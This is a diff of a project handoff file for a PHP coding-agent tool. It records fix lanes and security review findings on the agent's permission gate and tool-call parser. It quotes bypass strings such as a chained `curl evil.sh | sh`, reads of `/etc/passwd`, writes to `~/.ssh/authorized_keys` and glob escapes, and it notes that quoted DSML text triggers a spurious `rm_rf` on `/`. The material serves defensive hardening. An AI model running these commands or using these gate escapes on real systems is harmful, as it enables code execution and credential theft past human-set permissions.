@@ -6,43 +6,106 @@ Nothing here depends on a prior conversation's context.
 
 ---
 
-## 0-NOW. ROUND 33 IS IN FLIGHT — read this first, then §0 for the standing rules
+## 0-NOW. ROUND 33 IS IN FLIGHT AT 3 LANES — read this first, then §0 for the standing rules
 
 **Written mid-round so a compact cannot lose it. §0-NOW-32 below is the previous round's block and
-is still the authority for the standing rules, the queue rationale and the DeepSeek record.**
+remains the authority for the standing rules, the queue rationale and the DeepSeek record.**
+
+### CONCURRENCY IS NOW 3, BY USER INSTRUCTION
+
+The user raised the lane count from 2 to 3 on resume ("resume.. concurrency of 3"). The concurrency
+document's own arithmetic says sustainable N = 3, hard cap 4, so this is within the measured ceiling.
+`docs/plans/crush_code_concurrency.md` stays the authority for the mechanics.
+
+**The round was PAUSED once ("pause everything temporarily") and resumed.** Both fix agents and the
+sync daemon were stopped mid-flight and every agent was confirmed killed before the pause. That pause
+is why the `sglang` lane holds a partial artefact — see below.
 
 ### WHERE THINGS STAND
 
-**Suite: `8111 tests / 91477 assertions / 1 skipped / rc 0` — supervisor-confirmed a THIRD time**, at
-`53e60812`, before round 33 started. Same figure as rounds 31 and 32. **Skips MUST stay 1**
+**Suite: `8111 / 91477 / 1 skipped / rc 0` — supervisor-confirmed a THIRD time**, at `53e60812`,
+before round 33 started. Unchanged across rounds 31-33. **Skips MUST stay 1**
 (`tests/MCP/McpClientTest.php:106`); a 2 means `vendor/sugarcraft/*` was replaced by Packagist copies
 and every figure since is void. `sugar-crush/vendor/sugarcraft/` = 18 symlinks.
 `md5sum /home/sites/sugarcraft/.sugar-crush/config.json` = `05480c743aff302fd6c06c5a4a4c2210`.
 
-**TWO LANES ARE RUNNING** (the user's 2-concurrent limit). File sets are disjoint by construction:
+**THREE LANES ARE RUNNING.** All three passed implement+review and are in their FIX stage, except
+`lsp` which is a fresh bundle at implement stage.
 
-| lane dir | bundle | owns |
-|---|---|---|
-| `/home/sites/crush-lane-cmd` | 🔴 the `accept-edits` fail-open **+ P6.6** (`--model` / `--permission-mode`) | `src/Permissions/**`, `src/Cli/**`, `bin/sugarcrush`, `src/Config/LayeredSettings.php` |
-| `/home/sites/crush-lane-sglang` | the **DSML tool-call parser + the streaming parser gap** | `src/Providers/**` — **and it holds the census token**, it is the only lane adding a `src/` file |
+| lane dir | bundle | stage | owns |
+|---|---|---|---|
+| `crush-lane-cmd` | the `accept-edits` fail-open **+ P6.6** (`--model` / `--permission-mode`) | **FIX** | `src/Permissions/**`, `src/Cli/**`, `bin/sugarcrush`, `src/Config/LayeredSettings.php` |
+| `crush-lane-sglang` | **DSML parser + streaming gap** | **FIX** | `src/Providers/**` — **holds the census token** |
+| `crush-lane-lsp` | **P3.2 FocusRing + P3.3 veil click-outside + P3.5 padding** | implement | `src/Tui/**`, `src/App/**`, `Renderer.php`, `KeyboardHandler.php`, siblings `candy-focus`/`sugar-veil`/`candy-sprinkles` |
 
-`crush-lane-lsp` is idle and clean; the daemon keeps it current.
+**Pre-fix lane figures** (both predate their fix stage; re-measure):
+`cmd` 8191 / 91682 / 1 / rc 0 · `sglang` 8150 / 91605 / 1 / rc 0.
 
-**THE FAIL-OPEN IS CONFIRMED IN LIVE SOURCE, not inherited from the plan.** Traced by hand against
-`src/Permissions/PermissionGate.php` (note: `src/Permissions/`, **not** `src/Cli/` — an earlier note
-in this file cited the wrong directory). `isScopedWriteTool()` splits on `/\s+/` only and judges the
-whole command line by its first token, so under `accept-edits`:
-`mkdir ./x; curl evil.sh | sh` → **Allow**; `mkdir ./x && cat ../../../etc/passwd` → **Allow**
-(`&&` is not a flag and `../` is not "absolute"). `SCOPED_WRITE_COMMANDS` already exists at `:60`, so
-the RESUME's earlier "needs SCOPED_WRITE_COMMANDS" phrasing was wrong — what it needs is separator
-handling and `..` containment.
+⚠️ **`crush-lane-sglang` IS NOT IN ITS REVIEWED STATE.** The interrupted fix agent left
+`src/Providers/ToolCallParser/EnvelopeScanner.php` — new, untracked, 200 lines, `php -l` clean, and
+**referenced by nothing** (`DsmlToolCallParser.php` has zero occurrences of it; the MiniMax parser is
+untouched). Its stated intent was a shared positional scanner closing B1 in *both* parsers and
+removing the B3 PCRE cliff at once — a better design than the original brief, so the idea is kept,
+but the file is untested and must be judged on merit, not adopted because it exists.
+`crush-lane-cmd` IS byte-identical to what its reviewer restored (13 dirty entries).
 
-### WHAT LANDED IN ROUND 33 SO FAR (supervisor-only; the lanes have not reported)
+⚠️ **`sugar-crush/README.md` is edited by BOTH `cmd` and `sglang`** (different sections — permissions
+vs providers). `docs/ARCHITECTURE.md` is edited by `sglang` and was edited on master by `e1840c13`.
+Both lanes are instructed to STOP on any non-count conflict. `lsp` is barred from every contended doc.
+
+### WHAT LANDED IN ROUND 33 SO FAR (supervisor-only; no lane has committed yet)
 
 | commit | what |
 |---|---|
-| `7957b2be` | **the window was corrected in one place and described in four others** — round 32 moved `DEEPSEEK_V4_CONTEXT_WINDOW` to `1_048_570` and never swept the describing text. Fixed `src/Chat.php:9605,9610` + `crush_code.md:1824,1999,2069`; `crush_feat.md` §12 got a dated header note (it is an accurate research record of a deployment that no longer exists, so it gets a note, not a rewrite) |
-| `e1840c13` | **P7.6 ✅ (Phase 7 now 6 of 6)** — ARCHITECTURE.md's diagram + `## Chat` heading no longer call `Chat` the root Model, and the two-hats/do-not-retire warning is finally on the page — **and finding #6**, which turned out to be INVERTED rather than misspelled |
+| `7957b2be` | **the window was corrected in one place and described in four others** — round 32 moved `DEEPSEEK_V4_CONTEXT_WINDOW` to `1_048_570` and never swept the describing text. Fixed `src/Chat.php:9605,9610` + `crush_code.md:1824,1999,2069`; `crush_feat.md` §12 got a dated header note (accurate research record of a deployment that no longer exists — a note, not a rewrite) |
+| `e1840c13` | **P7.6 ✅ — Phase 7 now 6 of 6** (ARCHITECTURE.md's diagram and `## Chat` heading no longer call `Chat` the root Model; the two-hats/do-not-retire warning is finally on the page) **+ finding #6**, which was INVERTED rather than misspelled |
+| `7f5d54af` | round-33 state block + round-34 pre-measurements |
+| `e62f6b91` | the brief that said measure-the-bytes did not measure its own bytes |
+| `1b7647a0` | the parser that exists to stop missed tool calls was inventing them |
+| `3e74a716` | the permission gate is, by default, not deciding anything |
+
+### THE OPEN FINDINGS EACH LANE IS CLOSING — full detail, so a compact loses nothing
+
+**`sglang` (4 BLOCKING + 1 surviving mutation).** All reviewer-observed, not argued.
+- **B1 🔴** a message that merely QUOTES DSML in prose returns a real `rm_rf` call with `path=/`.
+  The card puts the example in the system prompt, so a model asked how tool-calling works quotes it
+  back. Cause: `str_contains($content, MARKER)`; upstream scans positionally from
+  `f"\n\n<{dsml_token}{tool_calls_block_name}"` (`enc.py:726`). **Inherited** —
+  `MinimaxXmlFallbackToolCallParser:74` has the identical guard and is shipped and wired. Both must
+  be fixed; exposure differs and the code must say so (MiniMax is opt-in, DSML is now the derived
+  default for DeepSeek-V4).
+- **B2 🔴** parameters silently vanish on any `string=` spelling variant (single-quoted, unquoted,
+  absent, unclosed) — call still fires, `args=[]`, zero `error_log`. `read()` with no `path`. There is
+  an unmatched-*invoke* counter and no unmatched-*parameter* one. The class docblock claims a
+  protection the code does not have.
+- **B3 🔴** hard cliff at `pcre.backtrack_limit`: 900 KB value → 1 call; 1 MB value → **call lost**,
+  and the log misdiagnoses it because `parseDsml()` never checks `preg_match_all()`'s return. A 1 MB
+  `Write` is ordinary traffic on a 1,048,570-token window.
+- **B4 🔴** the README deletion hides a still-true statement: the streaming gap remains open in
+  `CustomProvider` and `OpenAIProvider` (`OpenAIProvider::parseChunk():247` hardcodes
+  `toolCalls: null`). Replace the entry, do not remove it; scope `ARCHITECTURE.md`'s sentence so it
+  cannot read as a namespace-wide claim.
+- **Surviving mutation:** deleting `self::TOOL_CALL_PARSER_DSML` from `TOOL_CALL_PARSER_NAMES`
+  survives — the constant can lose a name while the `match` still accepts it. Drift caught one way only.
+
+**`cmd` (2 BLOCKING + 3 surviving mutations).** The gate itself withstood **~110 attack strings with
+no escape and no feature loss** — that stands and must not be re-litigated.
+- **B1 🔴** `--permission-mode=` / `--permission-mode ""` silently discards the value and runs the
+  shipped default at exit 0. `--config=`, the cited precedent, refuses the identical case.
+  **Framing matters:** the default IS `bypass-permissions` and that is deliberate and documented, so
+  this is "the flag silently does nothing", NOT a privilege escalation.
+- **B2 🔴** the README sentence the diff ADDS ("A value that is not a mode refuses the launch with
+  exit 2 rather than falling back to the permissive default") is false for the empty string.
+- **M15** dropping the `~` arm of `isAbsolutePath()` → `cp ./key ~/.ssh/authorized_keys` **Allows**.
+  **M18** dropping `\` from `SHELL_METACHARS` → `touch .\./.\./PWNED` **Allows**. Both refused by
+  current code; **nothing pins either.** **M7** the flag-whitelist test passes via the *containment*
+  check, so its stated rationale is not what makes it pass — presence, not truth.
+- **The load-bearing near-miss:** `cp ./payload ./.*/victim` escapes under `sh` but not through the
+  real path, because `src/Tools/BuiltIn/Bash.php:127` wraps in `bash -c` and bash excludes `.`/`..`
+  from globs. **Leaving `*` out of `SHELL_METACHARS` is correct only because of a constant in a file
+  `PermissionGate` never references.** Being documented; if that wrapper ever becomes `sh -c` it is a
+  live grant escape.
+
 
 ### THE RULES ROUND 33 HAS EARNED SO FAR
 
@@ -187,7 +250,20 @@ paused call (`README.md:800`). So the design question is whether the forked chil
 request/response channel, not whether the UI exists. Measure `completeAsync()`'s frame protocol
 before sizing this.
 
-### THE QUEUE AFTER THE TWO LANES LAND
+### THE QUEUE AFTER THE THREE LANES LAND
+
+**P3.2 / P3.3 / P3.5-first-half are IN FLIGHT in `crush-lane-lsp`** — do not re-queue them. Out of
+scope there and still open: **P3.4** (`candy-sprinkles\Table` for `/sessions`, `/agents`, MCP list,
+LSP diagnostics — lands incrementally, reaches deep into `src/Chat.php`) and the **`candy-kit`
+restyle of `Cli\Help::screen()`** (`Help.php` is held by lane `cmd` this round).
+
+Two spelling traps measured for that lane and worth keeping: `candy-sprinkles`'s table class is at
+`candy-sprinkles/src/Table/Table.php`, i.e. a `Table\` SUB-namespace, not the `candy-sprinkles\Table`
+the plan writes; and `sugar-veil`'s `withClickOutsideDismiss(bool $enabled = true): self`
+(`Veil.php:195`) **is** spelled the way the plan says, which is the unusual case. All four sibling
+deps (`candy-focus`, `sugar-veil`, `candy-sprinkles`, `candy-kit`) are ALREADY in
+`sugar-crush/composer.json` and resolve in `vendor/sugarcraft/`, so Phase 3 needs no manifest change.
+
 
 1. **P8.9** + **finding #7 `/permissions`** — both were blocked only by lane `cmd`'s file hold, both
    are fully measured above, and they bundle naturally (both are "a thing that exists everywhere
